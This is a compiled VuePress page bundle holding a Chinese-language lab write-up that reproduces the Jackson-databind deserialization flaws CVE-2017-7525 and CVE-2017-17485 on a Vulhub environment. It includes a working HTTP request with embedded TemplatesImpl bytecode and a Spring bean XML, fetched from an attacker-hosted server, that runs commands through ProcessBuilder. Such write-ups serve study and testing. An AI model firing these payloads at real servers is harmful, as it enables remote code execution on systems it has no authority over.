import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as l,o,c as A,a as n,b as e,d as i,e as s}from"./app-58e4a7d6.js";const c={},d=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),e(" 漏洞描述")],-1),r={href:"https://github.com/FasterXML/jackson-docs/wiki/JacksonPolymorphicDeserialization",target:"_blank",rel:"noopener noreferrer"},p=n("code",null,"TemplatesImpl",-1),u=s(`<p>所以，本漏洞利用条件如下：</p><ul><li><p>开启 JacksonPolymorphicDeserialization，即调用以下任意方法</p><div class="language-java line-numbers-mode" data-ext="java"><pre class="language-java"><code>objectMapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// default to using DefaultTyping.OBJECT_AND_NON_CONCRETE</span>
objectMapper<span class="token punctuation">.</span><span class="token function">enableDefaultTyping</span><span class="token punctuation">(</span><span class="token class-name">ObjectMapper<span class="token punctuation">.</span>DefaultTyping</span><span class="token punctuation">.</span><span class="token constant">NON_FINAL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div></li><li><p>Target class 需要有无参 constructor</p></li><li><p>Target class 中需要需要有字段类型为 Interface、abstract class、Object，并且使用的 Gadget 需要为其子类 / 实现接口</p></li></ul><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 搭建环境：</p><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code><span class="token function">docker-compose</span> up <span class="token parameter variable">-d</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，Web 运行在 <code>http://your-ip:8080/</code>。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><h3 id="cve-2017-7525" tabindex="-1"><a class="header-anchor" href="#cve-2017-7525" aria-hidden="true">#</a> CVE-2017-7525</h3>`,8),v=n("code",null,"Jackson-databind",-1),m=n("code",null,"SetterlessProperty",-1),b=n("code",null,"getOutputProperties()",-1),g=n("code",null,"transletBytecodes",-1),h={href:"https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/",target:"_blank",rel:"noopener noreferrer"},x=n("code",null,"TemplatesImpl",-1),_=s(`<p>使用 JDK7u21 的 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> 作为 Gadget，发送如下请求，将会执行 <code>touch /tmp/prove1.txt</code>：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /exploit HTTP/1.1
Host: your-vps-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 1298

{
  &quot;param&quot;: [
    &quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;,
    {
      &quot;transletBytecodes&quot;: [
  &quot;yv66vgAAADMAKAoABAAUCQADABUHABYHABcBAAVwYXJhbQEAEkxqYXZhL2xhbmcvT2JqZWN0OwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAcTGNvbS9iMW5nei9zZWMvbW9kZWwvVGFyZ2V0OwEACGdldFBhcmFtAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAhzZXRQYXJhbQEAFShMamF2YS9sYW5nL09iamVjdDspVgEAClNvdXJjZUZpbGUBAAtUYXJnZXQuamF2YQwABwAIDAAFAAYBABpjb20vYjFuZ3ovc2VjL21vZGVsL1RhcmdldAEAEGphdmEvbGFuZy9PYmplY3QBAAg8Y2xpbml0PgEAEWphdmEvbGFuZy9SdW50aW1lBwAZAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwwAGwAcCgAaAB0BABV0b3VjaCAvdG1wL3Byb3ZlMS50eHQIAB8BAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAhACIKABoAIwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACUKACYAFAAhAAMAJgAAAAEAAgAFAAYAAAAEAAEABwAIAAEACQAAAC8AAQABAAAABSq3ACexAAAAAgAKAAAABgABAAAABgALAAAADAABAAAABQAMAA0AAAABAA4ADwABAAkAAAAvAAEAAQAAAAUqtAACsAAAAAIACgAAAAYAAQAAAAoACwAAAAwAAQAAAAUADAANAAAAAQAQABEAAQAJAAAAPgACAAIAAAAGKiu1AAKxAAAAAgAKAAAACgACAAAADgAFAA8ACwAAABYAAgAAAAYADAANAAAAAAAGAAUABgABAAgAGAAIAAEACQAAABYAAgAAAAAACrgAHhIgtgAkV7EAAAAAAAEAEgAAAAIAEw==&quot;
      ],
      &quot;transletName&quot;: &quot;a.b&quot;,
      &quot;outputProperties&quot;: {}
    }
  ]
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241343764.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241343458.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这个 POC 只能运行在目标为 JDK7u21 以下的环境中，其他情况请更换 Gadget。</p><h3 id="cve-2017-17485" tabindex="-1"><a class="header-anchor" href="#cve-2017-17485" aria-hidden="true">#</a> CVE-2017-17485</h3>`,6),k={href:"https://github.com/FasterXML/jackson-databind/commit/60d459cedcf079c6106ae7da2ac562bc32dcabe1",target:"_blank",rel:"noopener noreferrer"},f=n("code",null,"org.springframework.context.support.FileSystemXmlApplicationContext",-1),B=s(`<p>利用该漏洞，我们需要创建一个 bean 文件，放置在任意服务器上，如 <code>http://evil/spel.xml</code>，内容如下：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot;
       xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
       xsi:schemaLocation=&quot;
     http://www.springframework.org/schema/beans
     http://www.springframework.org/schema/beans/spring-beans.xsd
&quot;&gt;
    &lt;bean id=&quot;pb&quot; class=&quot;java.lang.ProcessBuilder&quot;&gt;
        &lt;constructor-arg&gt;
            &lt;array&gt;
                &lt;value&gt;touch&lt;/value&gt;
                &lt;value&gt;/tmp/prove2.txt&lt;/value&gt;
            &lt;/array&gt;
        &lt;/constructor-arg&gt;
        &lt;property name=&quot;any&quot; value=&quot;#{ pb.start() }&quot;/&gt;
    &lt;/bean&gt;
&lt;/beans&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后，发送如下数据包，使 Jackson 加载 bean，触发漏洞：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /exploit HTTP/1.1
Host: your-vps-ip:8080
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 134

{
  &quot;param&quot;: [
    &quot;org.springframework.context.support.FileSystemXmlApplicationContext&quot;,
    &quot;http://your-vps-ip/spel.xml&quot;
  ]
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241346666.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>成功执行 <code>touch /tmp/prove2.txt</code>：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202241345505.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,7);function E(w,C){const a=l("ExternalLinkIcon");return o(),A("div",null,[d,n("p",null,[e("Jackson-databind 支持 "),n("a",r,[e("Polymorphic Deserialization"),i(a)]),e(" 特性（默认情况下不开启），当 json 字符串转换的 Target class 中有 polymorph fields，即字段类型为接口、抽象类或 Object 类型时，攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 "),p,e("，可以实现任意代码执行。")]),u,n("p",null,[v,e(" 在设置 Target class 成员变量参数值时，若没有对应的 getter 方法，则会使用 "),m,e(" 调用 getter 方法，获取变量，然后设置变量值。当调用 "),b,e(" 方法时，会初始化 "),g,e(" 包含字节码的类，导致命令执行，具体可参考 "),n("a",h,[e("java-deserialization-jdk7u21-gadget-note"),i(a)]),e(" 中关于 "),x,e(" 的说明。")]),_,n("p",null,[e("CVE-2017-7525 "),n("a",k,[e("黑名单修复"),i(a)]),e(" 绕过，利用了 "),f,e("。")]),B])}const V=t(c,[["render",E],["__file","Jackson-databind 反序列化漏洞 CVE-2017-7525_CVE-2017-17485.html.vue"]]);export{V as default};
